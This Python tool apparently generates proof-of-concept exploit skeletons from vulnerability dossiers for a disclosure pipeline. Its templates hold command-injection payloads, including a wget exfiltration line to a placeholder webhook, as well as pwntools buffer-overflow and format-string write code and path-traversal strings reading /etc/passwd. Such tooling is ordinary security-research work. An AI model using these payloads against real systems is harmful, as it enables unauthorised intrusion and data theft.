#!/usr/bin/env python3
"""auto_poc_generator -- emit pwntools / curl / scapy PoC skeletons from a dossier.

Bridges "a vuln pattern is identified" → "a working PoC skeleton exists to
validate it dynamically".

Honesty constraints:

  1. Generated PoC is a STARTING POINT, not a finished exploit. Marked
     with `# TODO operator:` everywhere a target-specific value is needed.
  2. Per-pattern templates: one function per category to avoid the
     deeply-nested-triple-quote issue from the first draft.
  3. Refuses to emit for severity < medium (no false-positive flood).
  4. Every PoC includes a poc_NOTES.md companion that records what was
     assumed + what the operator must verify before claiming the bug.
"""

from __future__ import annotations

import argparse
import json
import sys
from pathlib import Path

SEV_RANK = {"critical": 5, "high": 4, "medium": 3, "low": 2, "info": 1}

PREAMBLE = "#!/usr/bin/env python3\n"

# ── Per-category templates (one function each) ───────────────────────


def _tpl_command_injection(binary_name: str, pattern: str, matched: list) -> str:
    matched_str = ", ".join(matched)
    lines = [
        PREAMBLE,
        '"""PoC skeleton -- command injection in ' + binary_name + ".",
        "",
        "Pattern: " + pattern + " (matched imports: " + matched_str + ")",
        "",
        "STARTING POINT, not a finished exploit. Operator must:",
        "  - identify the operator-controlled input that flows to the matched call",
        "  - construct a payload that injects shell metacharacters",
        "  - validate the payload reaches the sink (dynamic test)",
        '"""',
        "import sys",
        "",
        "# TODO operator: identify the operator-controlled input source.",
        "# Common IoT/router sources: HTTP query/form param, NVRAM key,",
        "# SNMP set, WebSocket, UPnP M-SEARCH.",
        "",
        "PAYLOADS = [",
        "    '; id',                                      # recon",
        "    '$(id)',",
        "    '`id`',",
        "    '| id',",
        "    '; wget http://YOUR_WEBHOOK/$(whoami)',     # OOB exfil",
        "    '; touch /tmp/poc_marker_$(date +%s)',      # file-write probe",
        "]",
        "",
        "def send(target_url, payload):",
        '    """TODO operator: implement transport.',
        "    Common: requests.post(target_url, data={'param': payload}).text",
        '    """',
        "    raise NotImplementedError('operator: implement transport')",
        "",
        "if __name__ == '__main__':",
        "    target = sys.argv[1] if len(sys.argv) > 1 else 'http://192.168.1.1/cgi-bin/luci'",
        "    for p in PAYLOADS:",
        "        print('[poc] payload: ' + repr(p))",
        "        try:",
        "            r = send(target, p)",
        "            if 'uid=' in r or 'root' in r:",
        "                print('[poc] HIT -- command-injection confirmed')",
        "                sys.exit(0)",
        "        except NotImplementedError:",
        "            print('[poc] operator must implement send() before running')",
        "            sys.exit(2)",
        "    print('[poc] no payload triggered -- refine + try targeted metas')",
    ]
    return "\n".join(lines) + "\n"


def _tpl_buffer_overflow(binary_name: str, pattern: str, matched: list) -> str:
    matched_str = ", ".join(matched)
    lines = [
        PREAMBLE,
        '"""PoC skeleton -- buffer overflow in ' + binary_name + ".",
        "",
        "Pattern: " + pattern + " (matched: " + matched_str + ")",
        "",
        "STARTING POINT. Operator must:",
        "  - find the buffer offset (cyclic pattern via pwntools)",
        "  - identify where overflow lands (RIP / SLR / canary)",
        "  - build a ROP chain or ret2win to a known function",
        "  - if PIE, leak the load address first",
        '"""',
        "from pwn import *",
        "import sys",
        "",
        "# TODO operator: set these to match the target binary",
        "BINARY = './" + binary_name + "'",
        "REMOTE_HOST = None     # set to 'host:port' for remote",
        "OFFSET = 0             # determined via cyclic pattern; replace",
        "WIN_ADDR = 0x0         # ret2win address; replace",
        "",
        "def find_offset():",
        '    """Step 1: find the BoF offset using pwntools cyclic patterns."""',
        "    p = process(BINARY) if not REMOTE_HOST else remote(*REMOTE_HOST.split(':'))",
        "    p.sendline(cyclic(512))",
        "    p.wait()",
        "    core = p.corefile",
        "    offset = cyclic_find(core.fault_addr & 0xffffffff)",
        "    print('[poc] offset = ' + str(offset))",
        "    return offset",
        "",
        "def trigger():",
        '    """Step 2: send the BoF + ret-target."""',
        "    payload = b'A' * OFFSET + p64(WIN_ADDR)",
        "    p = process(BINARY) if not REMOTE_HOST else remote(*REMOTE_HOST.split(':'))",
        "    p.sendline(payload)",
        "    p.interactive()",
        "",
        "if __name__ == '__main__':",
        "    if OFFSET == 0:",
        "        find_offset()",
        "        sys.exit(0)",
        "    trigger()",
    ]
    return "\n".join(lines) + "\n"


def _tpl_format_string(binary_name: str, pattern: str, matched: list) -> str:
    matched_str = ", ".join(matched)
    lines = [
        PREAMBLE,
        '"""PoC skeleton -- format-string in ' + binary_name + ".",
        "",
        "Pattern: " + pattern + " (matched: " + matched_str + ")",
        "",
        "STARTING POINT. Operator must:",
        "  - confirm operator input reaches printf-family as FORMAT arg",
        "  - find the offset to operator-controlled bytes via %p sweep",
        "  - if read primitive needed, use %s with target address",
        "  - if write primitive needed, use %n with crafted offset",
        '"""',
        "from pwn import *",
        "import sys",
        "",
        "BINARY = './" + binary_name + "'",
        "REMOTE_HOST = None",
        "",
        "def leak_sweep():",
        '    """Step 1: sweep %p offsets to find operator-controlled bytes."""',
        "    for i in range(1, 30):",
        "        payload = b'AAAA%' + str(i).encode() + b'$p'",
        "        p = process(BINARY) if not REMOTE_HOST else remote(*REMOTE_HOST.split(':'))",
        "        p.sendline(payload)",
        "        out = p.recvline(timeout=2)",
        "        print('[poc] offset ' + str(i) + ': ' + out.decode(errors='replace').strip())",
        "        p.close()",
        "",
        "def write_primitive(target_addr, value, offset):",
        '    """Step 2 (post-leak): use %n to write `value` at `target_addr`."""',
        "    payload = fmtstr_payload(offset, {target_addr: value})",
        "    return payload",
        "",
        "if __name__ == '__main__':",
        "    leak_sweep()",
    ]
    return "\n".join(lines) + "\n"


def _tpl_weak_crypto(binary_name: str, pattern: str, matched: list) -> str:
    matched_str = ", ".join(matched)
    lines = [
        PREAMBLE,
        '"""PoC skeleton -- weak crypto / RNG in ' + binary_name + ".",
        "",
        "Pattern: " + pattern + " (matched: " + matched_str + ")",
        "",
        "STARTING POINT. For weak_rng_rand: enumerate seed candidates",
        "(typically time(NULL) ± a few seconds) and predict the token.",
        '"""',
        "import sys",
        "import time",
        "",
        "def predict_libc_rand(seed):",
        '    """Reproduce libc rand() given a srand(seed) call."""',
        "    # libc rand() formula varies -- this is the LCG variant.",
        "    s = seed & 0xFFFFFFFF",
        "    s = (s * 1103515245 + 12345) & 0x7FFFFFFF",
        "    return s",
        "",
        "def enumerate_seed_window():",
        '    """Try seeds within ±300s of the current time."""',
        "    now = int(time.time())",
        "    candidates = []",
        "    for offset in range(-300, 301):",
        "        seed = now + offset",
        "        token = predict_libc_rand(seed)",
        "        candidates.append((seed, token))",
        "    return candidates",
        "",
        "if __name__ == '__main__':",
        "    print('[poc] enumerating seed window ±300s of now')",
        "    for seed, token in enumerate_seed_window()[:10]:",
        "        print('  seed=' + str(seed) + ' → token=' + str(token))",
        "    print('[poc] TODO operator: capture a real token, find seed match.')",
    ]
    return "\n".join(lines) + "\n"


def _tpl_path_traversal(binary_name: str, pattern: str, matched: list) -> str:
    matched_str = ", ".join(matched)
    lines = [
        PREAMBLE,
        '"""PoC skeleton -- path traversal in ' + binary_name + ".",
        "",
        "Pattern: " + pattern + " (matched: " + matched_str + ")",
        '"""',
        "import sys",
        "",
        "PAYLOADS = [",
        "    '../../../../etc/passwd',",
        "    '..%2f..%2f..%2f..%2fetc%2fpasswd',",
        "    '....//....//....//etc/passwd',",
        "    '\\\\..\\\\..\\\\..\\\\windows\\\\win.ini',",
        "]",
        "",
        "def send(target_url, payload):",
        '    """TODO operator: implement transport."""',
        "    raise NotImplementedError('operator: implement transport')",
        "",
        "if __name__ == '__main__':",
        "    target = sys.argv[1] if len(sys.argv) > 1 else 'http://192.168.1.1/file?name='",
        "    for p in PAYLOADS:",
        "        try:",
        "            r = send(target + p, '')",
        "            if 'root:' in r or '[boot]' in r.lower():",
        "                print('[poc] HIT -- path traversal: ' + p)",
        "                sys.exit(0)",
        "        except NotImplementedError:",
        "            print('[poc] operator: implement send()')",
        "            sys.exit(2)",
    ]
    return "\n".join(lines) + "\n"


def _tpl_generic(binary_name: str, pattern: str, matched: list) -> str:
    matched_str = ", ".join(matched)
    lines = [
        PREAMBLE,
        '"""PoC skeleton -- generic for ' + binary_name + ".",
        "",
        "Pattern: " + pattern + " (matched: " + matched_str + ")",
        "",
        "No specific template registered. Operator authors the PoC manually.",
        "See poc_NOTES.md for what the dossier surfaced.",
        '"""',
        "raise NotImplementedError('operator: write the PoC by hand')",
    ]
    return "\n".join(lines) + "\n"


# ── Category → template dispatch ─────────────────────────────────────


_CATEGORY_TEMPLATES = {
    "command_injection": _tpl_command_injection,
    "buffer_overflow": _tpl_buffer_overflow,
    "format_string": _tpl_format_string,
    "weak_crypto": _tpl_weak_crypto,
    "path_traversal": _tpl_path_traversal,
    "nvram_to_system": _tpl_command_injection,  # same shape
}


def _pick_template(category: str):
    return _CATEGORY_TEMPLATES.get(category, _tpl_generic)


# ── poc_NOTES.md emission ─────────────────────────────────────────────


def _emit_poc_notes(dossier: dict, picked: dict, template_used: str) -> str:
    binary = dossier.get("binary") or {}
    fn = binary.get("filename", "?")
    case_id = dossier.get("case_id", "?")
    pattern = picked.get("pattern", "?")
    severity = picked.get("severity", "?")
    cat = picked.get("category", "?")
    matched = ", ".join(picked.get("matched", []) or [])
    return (
        "# PoC notes -- " + fn + "\n"
        "\n"
        "_Generated by `auto_poc_generator.py`. dossier case_id: `" + case_id + "`._\n"
        "\n"
        "## What this PoC targets\n"
        "\n"
        "- Pattern selected: `" + pattern + "` (severity=" + severity + ", category=" + cat + ")\n"
        "- Imports/strings that triggered the pattern: `" + matched + "`\n"
        "- Template used: `" + template_used + "`\n"
        "\n"
        "## What the operator must do before running\n"
        "\n"
        "1. Implement the `send()` transport function (HTTP/SNMP/UPnP/etc).\n"
        "2. Replace TODO-operator markers in the .py with target-specific\n"
        "   addresses, offsets, parameter names.\n"
        "3. For BoF templates: run with `OFFSET=0` first to invoke the\n"
        "   cyclic-pattern offset finder, then re-run with the discovered\n"
        "   offset.\n"
        "4. For format-string templates: run leak_sweep() first to find\n"
        "   the operator-controlled-bytes offset, then build the read/write.\n"
        "5. Confirm the PoC actually triggers the bug (dynamic proof) before\n"
        "   marking the submission `poc_validated=true`. The disclosure-\n"
        "   pipeline OPA gate (`policy/disclosure.rego`) DENIES submissions\n"
        "   without validated PoCs.\n"
        "\n"
        "## Severity claim\n"
        "\n"
        "The dossier's pattern severity is **" + severity + "**. Per harbinger\n"
        "v5 methodology -- honest severity beats inflated severity. Until\n"
        "the PoC dynamically demonstrates impact, the severity is a\n"
        "HYPOTHESIS, not a finding.\n"
        "\n"
        "## See also\n"
        "\n"
        "- `DOSSIER.md` (full dossier)\n"
        "- `NARRATIVE.md` (analyst writeup with attacker-value gate)\n"
        "- `mitigation.md` (proposed fix -- required before disclosure)\n"
    )


# ── Top-level: produce poc.py + poc_NOTES.md from a dossier ─────────


def generate_poc(dossier: dict, *, target_function: str = None) -> dict:
    """Produce poc.py source + notes for the highest-severity vuln_pattern
    claim (or the operator-named function/pattern if specified)."""
    binary = dossier.get("binary") or {}
    binary_name = binary.get("filename", "target")
    claims = dossier.get("claims") or []

    # Pick the vuln_pattern claim to base the PoC on
    vuln_claims = [c for c in claims if (c.get("kind") or "").startswith("vuln_pattern:")]
    if not vuln_claims:
        return {
            "status": "no_vuln_pattern_claims",
            "message": "Dossier has no vuln_pattern:* claims; nothing to PoC against.",
        }
    vuln_claims.sort(key=lambda c: -SEV_RANK.get(c.get("content", {}).get("severity", "info"), 0))

    if target_function:
        # Operator named a function -- pick first claim mentioning it
        for c in vuln_claims:
            content = c.get("content") or {}
            if target_function in str(content):
                picked = content
                break
        else:
            picked = vuln_claims[0].get("content") or {}
    else:
        picked = vuln_claims[0].get("content") or {}

    severity = picked.get("severity", "info")
    if SEV_RANK.get(severity, 0) < SEV_RANK["medium"]:
        return {
            "status": "severity_below_threshold",
            "highest_severity": severity,
            "message": "Highest vuln_pattern severity is below `medium`; refusing to "
            "emit a PoC. Operator: investigate dynamically first.",
        }

    cat = picked.get("category", "")
    pattern_name = picked.get("pattern", "?")
    matched = picked.get("matched", []) or []

    template_fn = _pick_template(cat)
    poc_py = template_fn(binary_name, pattern_name, matched)
    notes = _emit_poc_notes(dossier, picked, template_fn.__name__)

    return {
        "status": "ok",
        "poc_py": poc_py,
        "poc_notes_md": notes,
        "picked": {
            "pattern": pattern_name,
            "category": cat,
            "severity": severity,
            "matched": matched,
        },
        "template_used": template_fn.__name__,
    }


def emit_poc(dossier_dir: Path) -> dict:
    """Read dossier.json, generate poc.py + poc_NOTES.md, write them."""
    d = Path(dossier_dir)
    dj = d / "dossier.json"
    if not dj.exists():
        return {"status": "error", "error": "no dossier.json at " + str(d)}
    dossier = json.loads(dj.read_text())
    result = generate_poc(dossier)
    if result.get("status") != "ok":
        return result
    poc = d / "poc.py"
    poc.write_text(result["poc_py"])
    poc.chmod(0o755)
    notes = d / "poc_NOTES.md"
    notes.write_text(result["poc_notes_md"])
    return {
        "status": "ok",
        "poc_py": str(poc),
        "poc_notes_md": str(notes),
        "picked": result["picked"],
        "template_used": result["template_used"],
    }


# ── Playbook-friendly entry ───────────────────────────────────────────


def playbook_emit_poc(*, dossier_dir: str) -> dict:
    return emit_poc(Path(dossier_dir))


# ── CLI ──────────────────────────────────────────────────────────────


def main(argv=None) -> int:
    p = argparse.ArgumentParser(prog="auto_poc_generator")
    p.add_argument("dossier_dir")
    p.add_argument("--function", default=None, help="Specific function/pattern to PoC against (else: highest severity)")
    args = p.parse_args(argv)

    d = Path(args.dossier_dir)
    dj = d / "dossier.json"
    if not dj.exists():
        print("[poc] no dossier.json at " + str(d), file=sys.stderr)
        return 2
    dossier = json.loads(dj.read_text())
    result = generate_poc(dossier, target_function=args.function)
    if result.get("status") != "ok":
        print(json.dumps(result, indent=2))
        return 1

    (d / "poc.py").write_text(result["poc_py"])
    (d / "poc.py").chmod(0o755)
    (d / "poc_NOTES.md").write_text(result["poc_notes_md"])

    print("[poc] wrote " + str(d / "poc.py"))
    print("[poc]       " + str(d / "poc_NOTES.md"))
    print(
        "[poc] picked: "
        + result["picked"]["pattern"]
        + " ("
        + result["picked"]["category"]
        + ", "
        + result["picked"]["severity"]
        + ")"
    )
    return 0


if __name__ == "__main__":
    sys.exit(main())
